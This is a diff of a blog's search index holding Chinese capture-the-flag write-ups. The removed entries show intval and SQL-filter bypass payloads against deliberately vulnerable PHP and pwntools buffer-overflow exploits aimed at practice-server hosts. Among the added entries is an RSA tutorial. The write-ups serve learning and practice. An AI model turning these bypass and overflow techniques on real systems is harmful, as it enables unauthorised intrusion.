@@ -1,33 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>RE-新年快乐</title>
-    <url>/2021/01/21/EZre/</url>
-    <content><![CDATA[<h1 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h1><a id="more"></a>
-
-<img src="https://i.loli.net/2021/01/24/whsWzYRnkfVULpu.png" >
-
-
-<p>是叫我们输入一个flag,看看就知道没什么卵用;</p>
-<p>拖进IDA后啥也没弄到，这时我就(想到)是不是需要脱壳??</p>
-<h2 id="先脱壳"><a href="#先脱壳" class="headerlink" title="先脱壳"></a>先脱壳</h2><img src="https://i.loli.net/2021/01/24/3CDRpBo5OWqVJrA.png" >
-
-<p>将脱壳后的exe程序拖入IDA中;<br>这时便可以看到脱掉壳的exe已经可以浏览函数了;<br>shift+F12看一下</p>
-<img src="https://i.loli.net/2021/01/24/ZdnzfDQT4hG9PMs.png" >
-
-<p>选中到flag F5跳转到函数页面分析得知是要我们输入一个字符串;</p>
-<img src="https://i.loli.net/2021/01/24/LnMOhdarKjwcJ4Y.png" >
-
-<p>且字符串和str2比较,相同则得到flag;由此得知flag=”flag{HappyNewYear!}”</p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>Re</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BJDCTF2020-The mystery of ip</title>
     <url>/2021/01/22/BJDCTF2020-The-mystery-of-ip/</url>
     <content><![CDATA[<p>先进入题目给的靶机</p>
@@ -65,284 +38,36 @@
       </tags>
   </entry>
   <entry>
-    <title>ctf.show-萌新web1-4</title>
-    <url>/2021/01/24/ctf-show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%921-7/</url>
-    <content><![CDATA[<p>简单记录sql绕过方法</p>
-<a id="more"></a>
-<h1 id="Question1"><a href="#Question1" class="headerlink" title="Question1"></a>Question1</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>ctf.show萌新计划web1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
-<span class="token prolog">&lt;?php
-# 包含数据库连接文件
-include("config.php");
-# 判断get提交的参数id是否存在
-if(isset($_GET['id']))&#123;
-    $id = $_GET['id'];
-    # 判断id的值是否大于999
-    if(intval($id) > 999)&#123;
-        # id 大于 999 直接退出并返回错误
-        die("id error");
-    &#125;else&#123;
-        # id 小于 999 拼接sql语句
-        $sql = "select * from article where id = $id order by id limit 1 ";
-        echo "执行的sql为：$sql&lt;br>";
-        # 执行sql 语句
-        $result = $conn->query($sql);
-        # 判断有没有查询结果
-        if ($result->num_rows > 0) &#123;
-            # 如果有结果，获取结果对象的值$row
-            while($row = $result->fetch_assoc()) &#123;
-                echo "id: " . $row["id"]. " - title: " . $row["title"]. " &lt;br>&lt;hr>" . $row["content"]. "&lt;br>";
-            &#125;
-        &#125;
-        # 关闭数据库连接
-        $conn->close();
-    &#125;
-    
-&#125;else&#123;
-    highlight_file(__FILE__);
-&#125;
-
-?></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
-<span class="token comment">&lt;!-- flag in id = 1000 --></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>参考<a href="https://blog.csdn.net/qq_41617034/article/details/94040212">CG-CTF</a>才知道这题考察的是intval漏洞，需要满足id=1000，同时intval($id)&gt;999要返回false;</p>
-<li>这里可以使用'1000'字符绕过，'1000'进行intval后还是1000("1000"同理) </li>   
-
-<li>125<< 3也可以，而8000>>3却不行.</li>   
-
-<li>当然可以使用680|320绕过</li>   
-
-<li>也可以使用hex(16进制)绕过：例如0x3e8</li>   
-
-<img src="https://i.loli.net/2021/01/24/laVFmL2G8YTKjky.png" >
-
-<p>任意一种方法都可get flag</p>
-<h1 id="Question2"><a href="#Question2" class="headerlink" title="Question2"></a>Question2</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token prolog">&lt;?php
-# 包含数据库连接文件
-include("config.php");
-# 判断get提交的参数id是否存在
-if(isset($_GET['id']))&#123;
-        $id = $_GET['id'];
-    if(preg_match("/or|\+/i",$id))&#123;
-            die("id error");
-    &#125;
-    # 判断id的值是否大于999
-    if(intval($id) > 999)&#123;
-        # id 大于 999 直接退出并返回错误
-        die("id error");
-    &#125;else&#123;
-        # id 小于 999 拼接sql语句
-        $sql = "select * from article where id = $id order by id limit 1 ";
-        echo "执行的sql为：$sql&lt;br>";
-        # 执行sql 语句
-        $result = $conn->query($sql);
-        # 判断有没有查询结果
-        if ($result->num_rows > 0) &#123;
-            # 如果有结果，获取结果对象的值$row
-            while($row = $result->fetch_assoc()) &#123;
-                echo "id: " . $row["id"]. " - title: " . $row["title"]. " &lt;br>&lt;hr>" . $row["content"]. "&lt;br>";
-            &#125;
-        &#125;
-        # 关闭数据库连接
-        $conn->close();
-    &#125;
-    
-&#125;else&#123;
-    highlight_file(__FILE__);
-&#125;
-
-?></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
-<span class="token comment">&lt;!-- flag in id = 1000 --></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<li>keycode：</li>
-<pre><code>
-if(preg_match("/or|\+/i",$id))
-</code></pre>
-
-<p>payload:同样用’1000’绕过</p>
-<h1 id="Question3"><a href="#Question3" class="headerlink" title="Question3"></a>Question3</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>ctf.show萌新计划web1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
-<span class="token prolog">&lt;?php
-# 包含数据库连接文件
-include("config.php");
-# 判断get提交的参数id是否存在
-if(isset($_GET['id']))&#123;
-        $id = $_GET['id'];
-    if(preg_match("/or|\-|\\|\*|\&lt;|\>|\!|x|hex|\+/i",$id))&#123;
-            die("id error");
-    &#125;
-    # 判断id的值是否大于999
-    if(intval($id) > 999)&#123;
-        # id 大于 999 直接退出并返回错误
-        die("id error");
-    &#125;else&#123;
-        # id 小于 999 拼接sql语句
-        $sql = "select * from article where id = $id order by id limit 1 ";
-        echo "执行的sql为：$sql&lt;br>";
-        # 执行sql 语句
-        $result = $conn->query($sql);
-        # 判断有没有查询结果
-        if ($result->num_rows > 0) &#123;
-            # 如果有结果，获取结果对象的值$row
-            while($row = $result->fetch_assoc()) &#123;
-                echo "id: " . $row["id"]. " - title: " . $row["title"]. " &lt;br>&lt;hr>" . $row["content"]. "&lt;br>";
-            &#125;
-        &#125;
-        # 关闭数据库连接
-        $conn->close();
-    &#125;
-    
-&#125;else&#123;
-    highlight_file(__FILE__);
-&#125;
-
-?></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
-<span class="token comment">&lt;!-- flag in id = 1000 --></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<li>keycode:</li>
-<pre><code>
-if(preg_match("/or|\-|\\|\*|\<|\>|\!|x|hex|\+/i",$id))
-</code></pre>
-同理
-
-
-<h1 id="Question4"><a href="#Question4" class="headerlink" title="Question4"></a>Question4</h1><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>ctf.show萌新计划web1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
-<span class="token prolog">&lt;?php
-# 包含数据库连接文件
-include("config.php");
-# 判断get提交的参数id是否存在
-if(isset($_GET['id']))&#123;
-        $id = $_GET['id'];
-    if(preg_match("/or|\-|\\\|\/|\\*|\&lt;|\>|\!|x|hex|\(|\)|\+|select/i",$id))&#123;
-            die("id error");
-    &#125;
-    # 判断id的值是否大于999
-    if(intval($id) > 999)&#123;
-        # id 大于 999 直接退出并返回错误
-        die("id error");
-    &#125;else&#123;
-        # id 小于 999 拼接sql语句
-        $sql = "select * from article where id = $id order by id limit 1 ";
-        echo "执行的sql为：$sql&lt;br>";
-        # 执行sql 语句
-        $result = $conn->query($sql);
-        # 判断有没有查询结果
-        if ($result->num_rows > 0) &#123;
-            # 如果有结果，获取结果对象的值$row
-            while($row = $result->fetch_assoc()) &#123;
-                echo "id: " . $row["id"]. " - title: " . $row["title"]. " &lt;br>&lt;hr>" . $row["content"]. "&lt;br>";
-            &#125;
-        &#125;
-        # 关闭数据库连接
-        $conn->close();
-    &#125;
-    
-&#125;else&#123;
-    highlight_file(__FILE__);
-&#125;
-
-?></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
-<span class="token comment">&lt;!-- flag in id = 1000 --></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<li>keycode:</li>
-<pre><code>
-if(preg_match("/or|\-|\\\|\/|\\*|\<|\>|\!|x|hex|\(|\)|\+|select/i",$id))
-</code></pre>
-
-<p>payload:使用’1000’</p>
+    <title>RE-新年快乐</title>
+    <url>/2021/01/21/EZre/</url>
+    <content><![CDATA[<h1 id="新年快乐"><a class="anchor" href="#新年快乐">#</a> 新年快乐</h1>
+<p><a id="more"></a></p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/24/whsWzYRnkfVULpu.png">https://i.loli.net/2021/01/24/whsWzYRnkfVULpu.png</a>&quot; &gt;</p>
+<p>是叫我们输入一个 flag, 看看就知道没什么卵用；</p>
+<p>拖进 IDA 后啥也没弄到，这时我就 (想到) 是不是需要脱壳？？</p>
+<h2 id="先脱壳"><a class="anchor" href="#先脱壳">#</a> 先脱壳</h2>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/24/3CDRpBo5OWqVJrA.png">https://i.loli.net/2021/01/24/3CDRpBo5OWqVJrA.png</a>&quot; &gt;</p>
+<p>将脱壳后的 exe 程序拖入 IDA 中；<br />
+ 这时便可以看到脱掉壳的 exe 已经可以浏览函数了；<br />
+shift+F12 看一下</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/24/ZdnzfDQT4hG9PMs.png">https://i.loli.net/2021/01/24/ZdnzfDQT4hG9PMs.png</a>&quot; &gt;</p>
+<p>选中到 flag F5 跳转到函数页面分析得知是要我们输入一个字符串；</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/24/LnMOhdarKjwcJ4Y.png">https://i.loli.net/2021/01/24/LnMOhdarKjwcJ4Y.png</a>&quot; &gt;</p>
+<p>且字符串和 str2 比较，相同则得到 flag; 由此得知 flag=&quot;flag {HappyNewYear!}&quot;</p>
 ]]></content>
       <categories>
         <category>wp</category>
       </categories>
       <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>砰！</title>
-    <url>/2021/01/26/pwn/</url>
-    <content><![CDATA[<p>放假在家准备接触一下从未挑战过的pwn</p>
-<a id="more"></a>
-<h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><h2 id="Download文件后checksec"><a href="#Download文件后checksec" class="headerlink" title="Download文件后checksec"></a>Download文件后checksec</h2><img src="https://i.loli.net/2021/01/26/7j8JaB9lHnkAOEz.png" >
-
-
-<p>地址在哪已经显而易见了,接着我们IDA静态分析一下;</p>
-<h2 id="找到漏洞函数"><a href="#找到漏洞函数" class="headerlink" title="找到漏洞函数"></a>找到漏洞函数</h2><img src="https://i.loli.net/2021/01/26/bWcCqv3JaAkjKLM.png" >
-
-<p>s的长度为60,而我们只能够输入32个字符,不足以栈溢出;<br>但是replace函数会把我们输入的I替换成you,I是一个字符,you是三个字符,这样输入20个I既不会超过32字符限制,最终替换成60个字符也能够填满s.</p>
-<h3 id="找到后门函数-08048F0D"><a href="#找到后门函数-08048F0D" class="headerlink" title="找到后门函数:08048F0D"></a>找到后门函数:08048F0D</h3><img src="https://i.loli.net/2021/01/26/IFjYROyJEVHSNhx.png" >
-
-<li>exp:</li>
-
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">27833</span><span class="token punctuation">)</span>
-payload <span class="token operator">=</span> <span class="token string">b'I'</span><span class="token operator">*</span><span class="token number">20</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x08048F0D</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>执行结果:</p>
-<img src="https://i.loli.net/2021/01/26/Udh2q8TIw3DECvR.png" >
-
-<p>拿到flag:<br>flag{5e9a24f6-ddb2-4237-b3e0-6d968c34cec8}</p>
-<h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>拖入IDA F5</p>
-<img src="https://i.loli.net/2021/01/26/yY1db59ZflEcagC.png" >
-
-
-<p>发现要求输入v5自变量;</p>
-<img src="https://i.loli.net/2021/01/26/BNTLOps68XFk7Ht.png" >
-
-<p>v5的可用栈大小为0x40<br>可以看出,这个gets绝对有问题;</p>
-<p>程序存在后门:</p>
-<img src="https://i.loli.net/2021/01/26/OR51iljEJaZWY7p.png" >
-
-<p>sub_40060D的地址为0x40060D</p>
-<p>下面我们可以写个脚本跑出flag;<br>在此之前我们知道v5的栈大小为0x40,但还需要加上返回值的8个字符;<br>最终为0x48.</p>
-<li>构造exp</li>
-
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28395</span><span class="token punctuation">)</span>
-payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40060D</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="https://i.loli.net/2021/01/26/SrE8Q7LZpRatNkH.png" >
-
-<p>得到flag:<br>flag{a15dd406-0d79-4f49-b5a0-3dde546a4d3d}</p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
+        <tag>Re</tag>
       </tags>
   </entry>
   <entry>
     <title>HASH破解</title>
     <url>/2021/01/26/HASH%E7%A0%B4%E8%A7%A3/</url>
-    <content><![CDATA[<p>待写</p>
-<a id="more"></a>
-<p>简单论述windows hash破解</p>
+    <content><![CDATA[<p>待写<br />
+<a id="more"></a><br />
+ 简单论述 windows hash 破解</p>
 ]]></content>
       <categories>
         <category>wiki</category>
@@ -352,117 +77,77 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
       </tags>
   </entry>
   <entry>
-    <title>请问大吉杯的签到是在这里签吗?</title>
-    <url>/2021/01/27/%E8%AF%B7%E9%97%AE%E5%A4%A7%E5%90%89%E6%9D%AF%E7%9A%84%E7%AD%BE%E5%88%B0%E6%98%AF%E5%9C%A8%E8%BF%99%E9%87%8C%E7%AD%BE%E5%90%97/</url>
-    <content><![CDATA[<p>之前没接触过zlib文件格式;一直在思考如何将文件中的zlib解压，这一题整整忙了我两天.<br>我是傻逼.</p>
-<a id="more"></a>
-<h2 id="Notepad查看"><a href="#Notepad查看" class="headerlink" title="Notepad查看"></a>Notepad查看</h2><p>把下载下来的png用Notepad打开，发现里面还藏着一个png.</p>
-<img src="https://i.loli.net/2021/01/27/VJ3P6ty4LqXoUCe.png" >
-
-<h2 id="我们用binwalk分离一下"><a href="#我们用binwalk分离一下" class="headerlink" title="我们用binwalk分离一下"></a>我们用binwalk分离一下</h2><img src="https://i.loli.net/2021/01/27/FoZMvwyrtHJ6QUD.png" >
-
-<img src="https://i.loli.net/2021/01/27/tdCzyXp8U5wS4iB.png" >
-
-<p>发现分离文件中有一张png,一张在zip里的png，一份空白文档(我以为有什么妙用,缩放(并不是)二维码什么的)以及一份zlib文件;(接下来的几天里我一直在攻略这份zlib)</p>
-<img src="https://i.loli.net/2021/01/27/NIRQDtWlx3kG2gU.png" >
-
-<p>依据在此,我更加确信这是出错在zlib.于是在搜索引擎里不断地搜索关于zlib解压的方法(我是傻逼)<br>···<br>···<br>后来,我才知道,有zlib说明大概率是LSB隐写;</p>
-<p>在此之前,我先把分离出的4张png都扫了一遍</p>
-<img src="https://i.loli.net/2021/01/27/qsa24LPozNOHSYI.jpg" >
-
-<img src="https://i.loli.net/2021/01/27/nSgAQOD2icHZNMT.jpg" >
-
-<img src="https://i.loli.net/2021/01/27/N13dXg7TDVlZiGJ.jpg" >
-
-<img src="https://i.loli.net/2021/01/27/sbgj7Dx4zcPTWde.jpg" >
-
-<p>可以清楚地知道,第二张图已经明确告诉我们扫到第二张就行了,error就在png2;</p>
-<img src="https://i.loli.net/2021/01/27/Z2lDuG6rELa35pF.png" >
-
-<h2 id="放入stegsolve-记住此刻原图的形状-我觉得倒像是一只兔子"><a href="#放入stegsolve-记住此刻原图的形状-我觉得倒像是一只兔子" class="headerlink" title="放入stegsolve (记住此刻原图的形状,我觉得倒像是一只兔子)"></a>放入stegsolve (记住此刻原图的形状,我觉得倒像是一只兔子)</h2><p>然后我们查看最低位通道图</p>
-<img src="https://i.loli.net/2021/01/27/6kRHfnOJqivBZPc.png" >
-
-<p>是的,没看错,二维码变了;但是还不可以扫喔.<br>接下来我们需要将原图和这张二维码异或一下.</p>
-<img src="https://i.loli.net/2021/01/27/CADyL2eYNq9gc6n.png" >
-不过我还找到另一个简便的出现方式
-<img src="https://i.loli.net/2021/01/27/xhVcW7QvK415pIR.png" >
-不约而同地,两张图都出现了神秘的符号;
-百度后了解了这是猪圈密码.
-<img src="https://i.loli.net/2021/01/27/FznuCJQO48jq7Yd.png" >
-
-<p>按照这个解密就好了;</p>
-<p>最后得到flag:flag{dajiadoaidjb}</p>
-<p>还是挺简单的,但是之前没接触过zlib,stegsolve用得也不熟练,导致这几天steam时长大大缩小/(ㄒoㄒ)/~~</p>
+    <title>RSA加密算法详细解说</title>
+    <url>/2021/02/08/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%B4/</url>
+    <content><![CDATA[<p>RSA 加密算法是一种非对称加密算法，加密由公钥，私钥，明文，密文四部分组成.<br />
+<a id="more"></a></p>
+<h2 id="取模运算"><a class="anchor" href="#取模运算">#</a> 取模运算</h2>
+<p>a mod n ≡ b 表示 a 与 b 对模 n 同余 (a,b 分别除以 n)</p>
+<p>&lt;li&gt; 举个栗子: 3 mod 2 ≡ 1 &lt;--&gt; 1mod2=1 且 3mod2=1&lt;/li&gt;</p>
+<h2 id="欧拉函数"><a class="anchor" href="#欧拉函数">#</a> 欧拉函数</h2>
+<p>任意给定正整数 n，计算在小于等于 n 的正整数之中，有多少个与 n 构成互质关系？计算这个值的方法就叫做欧拉函数，以 φ(n) 表示.</p>
+<p>&lt;li&gt; 例如，在 1 到 8 之中，与 8 形成互质关系的是 1、3、5、7，所以 φ(n)=4&lt;/li&gt;</p>
+<h3 id="在rsa算法中欧拉函数对以下定理成立"><a class="anchor" href="#在rsa算法中欧拉函数对以下定理成立">#</a> 在 RSA 算法中，欧拉函数对以下定理成立</h3>
+<p>1. 如果 n 可以分解成两个互质的整数之积，即 n=p×q，则有：φ(n)=φ(pq)=φ( p )φ( q );<br />
+2. 当 p 为质数，φ(p)=p-1</p>
+<p>所以有 φ(n)=(p-1)(q-1)</p>
+<h2 id="欧拉定理与模反元素"><a class="anchor" href="#欧拉定理与模反元素">#</a> 欧拉定理与模反元素</h2>
+<p>欧拉函数的用处，在于欧拉定理<br />
+ “欧拉定理” 指的是:<br />
+ 如果两个正整数 a 和 n 互质，则 n 的欧拉函数 φ(n) 可以让下面的等式成立：<br />
+a^φ(n)≡1(modn)<br />
+ 也就是说，a 的 φ(n) 次方被 n 除的余数为 1</p>
+<h3 id="模反元素的推导过程如下"><a class="anchor" href="#模反元素的推导过程如下">#</a> 模反元素的推导过程如下:</h3>
+<p>根据欧拉定理，有：<br />
+a^φ(n) = a × a^(φ(n)−1)≡1(modn)</p>
+<p>令 b=a^(φ(n)−1)，得：</p>
+<p>ab≡1(modn)<br />
+&lt;li&gt;b 就是 a 的模反元素 &lt;/li&gt;<br />
+&lt;li&gt; 所以，如果两个正整数 a 和 n 互质，那么一定可以找到整数 b 使得 ab-1 被 n 整除，或者说 ab 被 n 除的余数是 1&lt;/li&gt;</p>
+<p>&lt;li&gt; 所以求私钥 d 的公式：d*e≡1mod [(p-1)(q-1)]&lt;/li&gt;</p>
+<p>代入 φ(n) = (p-1)(q-1),φ(n) 与 e 互质，k 为正整数<br />
+可化为：d= (k*φ(n)+1)/e</p>
+<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>公钥    n -->  两素数p、q之积</pre></td></tr><tr><td data-num="2"></td><td><pre>        e -->  1&lt;e<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>(p-1)·(q-1)且e与乘积互质</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token attr-name">私钥</span>    <span class="token attr-name">d</span> <span class="token attr-name">--</span><span class="token punctuation">></span></span>  d·e ≡ 1 mod[(p-1)·(q-1)]</pre></td></tr><tr><td data-num="4"></td><td><pre>        n -->  同公钥n</pre></td></tr><tr><td data-num="5"></td><td><pre>加密    ----->  C ≡ M^e mod(n)   M为明文</pre></td></tr><tr><td data-num="6"></td><td><pre>解密    ----->  M ≡ C^d mod(n)   C为密文</pre></td></tr></table></figure><h2 id="由pqdpdqc求明文的算法"><a class="anchor" href="#由pqdpdqc求明文的算法">#</a> 由 p,q,dp,dq,c 求明文的算法</h2>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre>I <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>q<span class="token punctuation">,</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>mp <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dp<span class="token punctuation">,</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>mq <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>q<span class="token punctuation">)</span>               <span class="token comment">#求幂取模运算</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mp<span class="token operator">-</span>mq<span class="token punctuation">)</span><span class="token operator">*</span>I<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">*</span>q<span class="token operator">+</span>mq       <span class="token comment">#求明文公式</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token comment">#转为十六进制</span></pre></td></tr></table></figure><p>&lt;li&gt;pow (a,b,c) 表示 a^b% c 即 a^b mod c&lt;/li&gt;</p>
+<h3 id="数学运算规律"><a class="anchor" href="#数学运算规律">#</a> 数学运算规律</h3>
+<p>a^b%p = ((a%p)^b)%p<br />
+ 若 a≡b (% p), 则对任意的 c, 都有 (a+c)≡(b+c)(% p)<br />
+ 若 a≡b (% p), 则对任意的 c, 都有 (a<em>c)≡(b</em>c)(%p)<br />
+ 若 a≡b (% p), 对任意的 c, 都有 c≡d (% p), 那么 (a+c)≡(b+d)(% p),(a<em>c)≡(b</em>d)(%p)</p>
+<p>运算推论：参考 <a href="https://blog.csdn.net/mikecoke/article/details/105967809?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/mikecoke/article/details/105967809?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&amp;spm=1001.2101.3001.4242</a></p>
+<p>&lt;img src = '<a href="https://ftp.bmp.ovh/imgs/2021/02/6477b861b60b9672.png">https://ftp.bmp.ovh/imgs/2021/02/6477b861b60b9672.png</a>' /&gt;</p>
